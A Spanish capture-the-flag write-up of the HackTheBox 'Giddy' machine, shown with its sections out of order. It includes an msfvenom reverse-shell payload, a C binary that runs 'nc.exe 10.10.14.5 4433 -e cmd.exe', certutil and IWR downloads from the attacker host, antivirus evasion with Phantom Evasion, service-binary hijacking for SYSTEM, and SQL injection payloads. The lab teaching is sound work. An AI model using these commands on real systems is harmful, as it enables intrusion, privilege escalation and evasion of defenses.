+<p>:o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de <code>msfvenom</code> llamado <code>taskkill.exe</code> y posicionarlo en la ruta <code>C:\ProgramData\\unifi-video\</code>. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo <code>taskkill.exe</code>, lo ejecute y ver como obtenemos nuestra Shell (:</p>
+
+<p>Démosleeeeeeeeeeeeeeeeeeeeeeeeeeeee.</p>
+
+<p>…</p>
+
+<h3 id="msfvenom-taskkillexe">Generamos archivo <u>taskkill.exe</u> malicioso <a href="#msfvenom-taskkillexe">🔗</a></h3>
+
+<p>Creemos nuestro binario <code>taskkill.exe</code> con ayuda de <code>msfvenom</code>, le indicaremos que una vez se ejecute envíe una petición hacia X puerto con una <strong>CMD</strong>, o sea, generamos una <strong>Reverse Shell</strong>:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4433 -f exe &gt; taskkill.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+</code></pre>
+
+<p>Listo, ya lo tenemos, sigamos…</p>
+
+<h3 id="find-service-unifivideo">Buscamos servicio relacionado con <u>unifi-video</u> <a href="#find-service-unifivideo">🔗</a></h3>
+
+<p>Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar específicamente alguno relacionado con <code>unifi-video</code>.</p>
+
+<p>Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; net start
+net.exe : System error 5 has occurred.
+...
+Access is denied.
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; wmic service list brief
+WMIC.exe : ERROR:
+...
+Description = Access denied
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData&gt; Get-Service
+Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+...
+</code></pre>
+
+<blockquote>
+  <p>Tomadas de <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services">Hacktricks.xyz - WinPrivEsc/Services</a>.</p>
+</blockquote>
+
+<p>Así que tamos tristes :(</p>
+
+<p>Buscando en internet maneras de detener o iniciar procesos con <strong>PowerShell</strong>, encontramos dos herramientas:</p>
+
+<ul>
+  <li><a href="https://www.windows-commandline.com/start-stop-service-using-powershell/">Powershell: How to Start (<strong>start-service</strong>) or Stop (<strong>stop-service</strong>) services</a>.</li>
+</ul>
+
+<p>Pero seguimos igual, no sabemos el nombre del servicio…</p>
+
+<p>Probando algunos randoms siempre recibimos un error, por ejemplo buscando <code>unifi-video</code> como nombre de servicio:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service "unifi-video"
+Cannot find any service with service name 'unifi-video'.
+...
+</code></pre>
+
+<p>:(</p>
+
+<p>Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre <code>Ubiquiti UniFi Video</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que podemos probar con ese nombre, si no nos funciona ya tendríamos una base para quitar, agregar, modificar o juntar <strong>palabras</strong> en busca de algún nombre para el servicio.</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; Stop-Service "Ubiquiti UniFi Video"
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+</code></pre>
+
+<p>OPAAAAAAAAAAAAAAA, si señorrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra <strong>reverse Shell</strong>:</p>
+
+<h3 id="uploading-taskkillexe-ways">Subimos el binario al sistema de diferentes maneras <a href="#uploading-taskkillexe-ways">🔗</a></h3>
+
+<p>Aprovechemos y subamos el binario de 3 formas, con <code>certutil.exe</code>, con una de las opciones de <code>PowerShell</code> yyy con ayuda de una carpeta compartida por <strong>SMB</strong>:</p>
+
+<p>Levantemos un servidor web con <strong>Python</strong> en la ruta donde tenemos el archivo <code>taskkill.exe</code>:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<hr />
+
+<h5 id="certutilexe"><u>certutil.exe:</u></h5>
+
+<hr />
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; certutil.exe -f -urlcache -split http://10.10.14.5:8000/taskkill.exe taskkill.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+</code></pre>
+
+<p>Y ya lo tendriamos (:</p>
+
+<h5 id="usando-la-clase-invokewebrequest-de-powershell"><u>Usando la clase InvokeWebRequest de PowerShell:</u></h5>
+
+<hr />
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
+</code></pre>
+
+<p>Y tambien ya tendriamos el binario en la máquina victima.</p>
+
+<h5 id="compartiendo-una-carpeta-con-smb"><u>Compartiendo una carpeta con SMB:</u></h5>
+
+<hr />
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd)
+</code></pre>
+
+<p>Ya tendríamos nuestra carpeta compartida llamada <code>smbFolder</code> situada en la ruta del binario <code>taskkill.exe</code>, ahora desde la máquina víctima le decimos que se conecte a esa carpeta, pero que además haga una copia de uno de sus archivos a la ruta actual:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; copy \\10.10.14.5\smbFolder\taskkill.exe taskkill.exe
+</code></pre>
+
+<p>Recibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo <code>taskkill.exe</code> (:</p>
+
+<p>Listos, ahora si explotemos estooooo.</p>
+
+<p>Pongamonos en escucha por el puerto <strong>4433</strong> que fue el que indicamos en nuestro binario malicioso:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<hr />
+
+<h3 id="trying-service-taskkillexe">Intentamos que el servicio <u>unifi-video</u> ejecute el binario malicioso <a href="#trying-service-taskkillexe">🔗</a></h3>
+
+<p>Jugando con el binario y el servicio:</p>
+
+<ul>
+  <li><code>Stop-Service "Ubiquiti UniFi Video"</code></li>
+  <li><code>Start-Service "Ubiquiti UniFi Video"</code></li>
+</ul>
+
+<p>No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra <code>taskkill.exe</code>, si intentamos nosotros mismo ejecutarlo obtenemos esto:</p>
+
+<pre><code class="language-bash">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; .\taskkill.exe
+Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+...
+</code></pre>
+
+<p>Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo és :P) y por consiguiente esta siendo borrado… Esto puede ser obra del <code>antivirus</code>, el propio <code>Windows Defender</code> o incluso de algún <code>App Locker</code>. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :)</p>
+
+<p>…</p>
+
+<h3 id="bypass-av-and-things">Bypasseamos <u>Antivirus</u>, <u>Windows Defender</u>, <u>App Locker</u> y lo que se venga <a href="#bypass-av-and-things">🔗</a></h3>
+
+<hr />
+
+<h5 id="fail-con-phantom-evasion">Fail con <u>Phantom Evasion<u></u></u></h5>
+
+<p>Buscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese último se llama <a href="https://github.com/oddcod3/Phantom-Evasion">Phantom Evasion</a>, una herramienta para eso, evadir cositas como los antivirus.</p>
+
+<blockquote>
+  <p><span style="color: #f34336;">Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo</span> :P</p>
+</blockquote>
+
+<p>Hay varios recursos que hablan de ella:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=fgjTbUrAHbg">YT - Evasión de antivirus con Phantom Evasion</a>.</li>
+  <li><a href="https://noticiasseguridad.com/tutoriales/como-evadir-proteccion-antivirus-con-phantom-payloads/">Cómo evadir protección antivirus con Phantom Payloads</a>.</li>
+</ul>
+
+<p>Después de descargarlo, en su ejecución la interfaz es sencilla:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_menu.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Obviaremos algunas opciones, vamos a irnos por el número <code>1</code> directamente:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_modules.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Acá (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opción, o sea escribimos <code>2</code>, esta opción nos generaría un binario que al ser ejecutado con éxito devolvería una falsa shell, es funcional para saber que tenemos ejecución de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan.</p>
+
+<p>Entonces, seleccionamos la opción <code>2</code>, nos devolverá la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:</p>
+
+<ul>
+  <li><code>LHOST</code>: Nuestra IP, <strong>10.10.14.5</strong>.</li>
+  <li><code>LPORT</code>: El puerto donde vamos a estar en escucha, <strong>4433</strong>.</li>
+  <li><code>Strip executable?</code>: Indicamos la letra <code>Y</code>, para SIIIIIIIIIIIIIIIIIIIIII e.e Esto hace que el binario no sea tan pesado.</li>
+  <li>La opción del certificado me daba errores, así que la cambie por <code>n</code> y ya todo perfecto.</li>
+  <li><code>Insert output filename</code>: <strong>taskkill</strong>. Que será el nombre del binario, en la opción anterior por default esta la extensión <code>exe</code>, así que tamos bien.</li>
+</ul>
+
+<p>Nos responde:</p>
+
+<pre><code class="language-bash">[&gt;] Generating code...
+
+[&gt;] Compiling...
+
+[&gt;] Strip binary...
+
+[&lt;&gt;] File saved in Phantom-Evasion folder
+</code></pre>
+
+<p>Y si revisamos el directorio donde ejecutamos <code>phantom evasion</code> vemos el binario <code>taskkill.exe</code>:</p>
+
+<pre><code class="language-bash">❱ file taskkill.exe 
+taskkill.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
+</code></pre>
+
+<p>Listooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si aún no estamos en escucha por el puerto del binario (4433) lo hacemos:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Subimos el binario, lo primero que vemos es que no nos lo borra, así que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS_startStop_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_fakeshell_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si si siiiiiii, recibimos una petición, por lo tanto hemos bypasseado tooooooodo todito.</p>
+
+<p>Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a <code>phantom evasion</code> como funcional, ahora solo nos quedaría probar entre sus opciones y ver cuál nos puede devolver una verdadera shell…</p>
+
+<p>Pero (de nuevo un peroooooo), como ya comente antes, probé y probé y nada, no logre hacer funcionar una shell…</p>
+
+<p>…</p>
+
+<p>En este punto ya estaba loco locooooooo, no sabía pa onde mirar, así que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Después de un rato, caí en cuenta de algo en lo que debí haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta <code>phantom evasion</code>.</p>
+
+<p><strong>Y sí nos creamos nosotros mismos un binario llamado <code>taskkill.exe</code> que haga lo que queramos? u.u jajaj</strong></p>
+
+<p>…</p>
+
+<p>Pos sí, démosle a esa idea, podemos apoyarnos del lenguaje de programación <code>C</code> y su función <code>system();</code>, simplemente para compilar el script a un formato válido en <strong>Windows</strong> usamos la herramienta <code>mingw-w64</code>. A darleeeee:</p>
+
+<p>Entonces, si no tenemos ni idea, una búsqueda rápida en internet nos dará vaaarios ejemplos como base:</p>
+
+<ul>
+  <li><a href="https://www.w3resource.com/c-programming-exercises/variable-type/c-variable-type-exercises-1.php">C Exercises: Invoke the command processor to execute a command</a>.</li>
+</ul>
+
+<p>Lo tomamos y nos quedamos únicamente con las librerías, la función main y la función <code>system</code>:</p>
+
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main () {
+    system();
+} 
+</code></pre>
+
+<p>Donde <code>system</code> tendrá lo que queramos ejecutar a nivel de sistema, para no hacer más largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e.e</p>
+
+<details>
+  <summary><strong>SPOILER resolución final</strong></summary>
+  
+  <span style="color: yellow;">El script y el binario generado van a ser la salvación e.e (esto no era lo que iba a escribir, pero pues me gusto, así que ahí se queda).</span>
+</details>
+
+<p>Como prueba anterior, subí el binario <code>nc.exe</code> a la máquina a ver si también era borrado, pero no, no lo borra el sistema, así que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida:</p>
+
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main () {
+    system("c:\\Users\\Stacy\\Videos\\nc.exe 10.10.14.5 4433 -e cmd.exe");
+} 
+</code></pre>
+
+<p>Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem">How to compile executable for Windows with GCC with Linux Subsystem?</a>.</li>
+</ul>
+
+<p>Inicialmente lo compilare para <strong>64 bits</strong> si no nos sirve, pues lo intentamos con <strong>32</strong>:</p>
+
+<pre><code class="language-bash">❱ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe
+</code></pre>
+
+<pre><code class="language-bash">❱ file taskkill.exe 
+taskkill.exe: PE32+ executable (console) x86-64, for MS Windows
+</code></pre>
+
+<p>Listo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto <strong>4433</strong> yyyyyy jugamos con el servicio:</p>
+
+<p>…</p>
+
+<blockquote>
+  <p>Me tire tooooooooodo lo que relacione a <code>Ruby</code> por instalar una herramienta que nos ayudaba con el <strong>Bypass de AV</strong>.</p>
+</blockquote>
+
+<p>(Y pues se fue a la p*** el <code>evil-winrm</code> asdjflkajsldkfñl)</p>
+
+<blockquote>
+  <p>Ya lo arreglé, tamos felices. Por no usar sandboxes o pequeños entornos que no afecten a las gemas y demás cositas. Algo más aprendido jajajaj a la fuerza pero aprendido.</p>
+</blockquote>
+
+<p>😇</p>
+
+<p>…</p>
+
+<p>Ahora sí, subamos todo a la máquina:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
+*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10.10.14.5:8000/nc64.exe -OutFile c:\Users\Stacy\Videos\nc.exe
+</code></pre>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Detenemos el servicio:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; stop-service "Ubiquiti UniFi Video"
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
+...
+</code></pre>
+
+<p>Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_NTauthoritySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e.e Tamos dentro del sistema como el usuario <strong>nt authority\system</strong>, el master de los masters.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_menhands_done.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>IT’S OOOOOOOOOOOOVER</p>
+
+<p>…</p>
+
+<p>Terminamos después de un largo camino, pero un camino llenísimo de aprendizaje, prácticamente todo lo que vimos en esta máquina fue nuevo para mí, así que increíble, muy lindo lo que hicimos y lo que probamos.</p>
+
+<p>Salió un bello script (que inicialmente no era la idea, iba a ser muuucho más sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e.e</p>
+
+<p>Muy linda máquina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos <strong>SQL</strong> y entornos super controlados, pero realmente no tanto, llega un script de visita con dos líneas y destruye todo lo que tenías “controlado” :(</p>
+
+<p>Bueno basta!! Los dejo descansar y perdón que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo.</p>
+
+<p>Nos leeremos después y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!!</p>
+
+<p>Tenemos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Vemos un <code>commonName</code> muy atractivo:</p>
+
+<ul>
+  <li><code>commonName=PowerShellWebAccessTestWebSite</code></li>
+</ul>
+
+<p>Nos da la idea de tener una Shell en la web, ya veremos.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>3389</td>
+      <td>RDP</td>
+      <td>Microsoft Terminal Services</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Muchas referencias al nombre <strong>Giddy</strong> (mayusculas y minusculas)</p>
+
+<ul>
+  <li><code>DNS_Computer_Name: Giddy</code></li>
+</ul>
+
+<p>Jmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos.</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">🔗</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un perrito :D de primeras se me ocurre algo con <strong>estenografía</strong> (ojalá no), pero sigamos explorando… Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos:</p>
+
+<pre><code class="language-bash">❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.104
+...
+Target: http://10.10.10.104/
+
+[25:25:25] Starting: 
+[25:25:25] 301 -  157B  - /aspnet_client  -&gt;  http://10.10.10.104/aspnet_client/
+[25:25:25] 302 -  157B  - /remote  -&gt;  /Remote/default.aspx?ReturnUrl=%2fremote
+[25:25:25] 301 -  157B  - /Aspnet_client  -&gt;  http://10.10.10.104/Aspnet_client/
+[25:25:25] 301 -  147B  - /mvc  -&gt;  http://10.10.10.104/mvc/
+[25:25:25] 301 -  157B  - /aspnet_Client  -&gt;  http://10.10.10.104/aspnet_Client/
+[25:25:25] 302 -  157B  - /Remote  -&gt;  /Remote/default.aspx?ReturnUrl=%2fRemote
+[25:25:25] 301 -  157B  - /ASPNET_CLIENT  -&gt;  http://10.10.10.104/ASPNET_CLIENT/
+[25:25:25] 400 -  324B  - /besalu%09
+[25:25:25] 400 -  324B  - /error%1F_log
+...
+</code></pre>
+
+<p>Opaa, encontramos tres rutas:</p>
+
+<ul>
+  <li><code>/aspnet_client</code>.</li>
+  <li><code>/remote</code>.</li>
+  <li><code>/mvc</code>.</li>
+</ul>
+
+<p>Validando cada una, <code>/aspnet_client</code> nos devuelve <code>acceso denegado</code> :( si revisamos <code>/remote</code>, con ella si obtenemos respuesta y caemos acá:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio <strong>HTTPS</strong>, así que nos movemos a:</p>
+
+<ul>
+  <li><code>https://10.10.10.104/remote</code></li>
+</ul>
+
+<p>Y conseguimos el mismo output, pero sin el error del <strong>SSL</strong> (: Juguemos con el login a ver…</p>
+
+<blockquote>
+  <p><code>Windows PowerShell Web Access</code> (que llamaremos <strong>PSWA</strong>): “acts as a Windows PowerShell gateway, providing a <strong>web-based Windows PowerShell console</strong> that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device.” <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)">Install and Use Windows PowerShell Web Access</a>.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://practical365.com/powershell-web-access-just-how-practical-is-it/">How to use Microsoft PowerShell Web Access</a>.</li>
+</ul>
+
+<p>Intentando algunas cositas como buscar <code>Windows PowerShell Web Access exploit</code> o credenciales por default, no conseguimos nada útil.</p>
+
+<p>Si nos fijamos ya sea con la extensión <code>Wappalyzer</code> de Firefox o con la herramienta <code>whatweb</code> vemos algo de <code>asp.net</code>:</p>
+
+<pre><code class="language-bash">❱ whatweb https://10.10.10.104/remote
+https://10.10.10.104/remote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/default.aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+
+https://10.10.10.104/Remote/default.aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/en-US/logon.aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+
+https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4.0.30319], Cookies[.redirect.], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.redirect.], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+</code></pre>
+
+<p>Contamos con la versión <code>4.0.30319</code> de <code>asp.net</code>, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :(</p>
+
+<p>…</p>
+
+<p>Veamos la ruta <code>/mvc</code> de la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ufff, muchos recursos (si nos fijamos a la derecha del todo aún quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:</p>
+
+<ul>
+  <li>Un botón de <strong>registro</strong>: <code>http://10.10.10.104/mvc/Account/Register.aspx</code>.</li>
+  <li>Un botón de <strong>login</strong>: <code>http://10.10.10.104/mvc/Account/Login.aspx</code>.</li>
+  <li>4 botones más, los 4 funcionales:
+    <ul>
+      <li><code>http://10.10.10.104/mvc/About.aspx</code>.</li>
+      <li><code>http://10.10.10.104/mvc/Contact.aspx</code>.</li>
+      <li><code>http://10.10.10.104/mvc/Search.aspx</code>.</li>
+    </ul>
+  </li>
+  <li>Los links que hacen referencia a nombres de productos tienen este formato:
+    <ul>
+      <li><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=12</code>, donde <strong>12</strong> puede ser cualquier número (o sea, cualquier producto).</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Vaya, varias cositas para probar (eso de los productos tiene una cara de <strong>SQLi</strong> que ufff), pero vamos por orden.</p>
+
+<p>Si nos creamos una cuenta, nos inicia sesión de una. Curiosamente no hay nada distinto a lo que vimos ya.</p>
+
+<p>Jugando con el apartado <code>Search.aspx</code> tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si insertamos algo como <code>&lt;h1&gt;Hola&lt;/h1&gt;</code>, para saber si podemos inyectar código HTML nos responde esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search_errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos devuelve un error, pero además de eso vemos varias cositas, como una ruta absoluta y algunas versiones que están siendo usadas con el servicio. Probando algo más interesante como inyectar consultas <strong>SQL</strong> no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Payload</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>1 order by 100</code></td>
+      <td style="text-align: left">Así intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos <strong>100</strong> columnas, si no existe ese número de columnas nos debería responder con un error, si vemos ese error, sabemos que es vulnerable y debemos empezar a jugar con el <strong>100</strong> hacia abajo para encontrar el número de columnas (cuando ya no nos arroje error sabremos que ese será el número de columnas).</td>
+    </tr>
+    <tr>
+      <td><code>1 or sleep(5)</code></td>
+      <td style="text-align: left">Para ver si existe una vulnerabilidad <strong>SQL</strong> basada en tiempo (si la consulta se demora 5 segundos en responder, sabríamos que es vulnerable).</td>
+    </tr>
+    <tr>
+      <td><code>;#</code></td>
+      <td style="text-align: left">Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este después de nuestro payload como comentario para que no interfiera con nuestra explotación</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero lo dicho, jugando con <code>Search.aspx</code> con algunos payloads no llegamos a ningún lado, así que movámonos a los productos.</p>
+
+<p>Seleccionamos cualquiera, por ejemplo el <strong>33</strong> que hace referencia a las <em>luces</em>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_light.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo:</p>
+
+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 100;#
+</code></pre>
+
+<blockquote>
+  <p>33, 1, 2 o 234, da igual el numero.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opaaaaaaa, confirmamos <strong>inyección SQL</strong> (: vemos el error que nos indica que <strong>100</strong> está fuera de rango del número de columnas, así que debemos empezar a bajar el número y ver en que momento dejamos de ver el error.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>También vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la <strong>SQLi</strong>…</p>
+
+<blockquote>
+  <p>Y un nuevo usuario, <code>jnogueira</code>, guardemoslo.</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="explotacion">Jugamos con la <u>inyección SQL</u> <a href="#explotacion">#</a></h2>
+
+<hr />
+
+<h3 id="mvc-sqli-orderby">Encontramos número de columnas usando <u>ORDER BY</u> <a href="#mvc-sqli-orderby">🔗</a></h3>
+
+<p>Moviendo números encontramos el límite:</p>
+
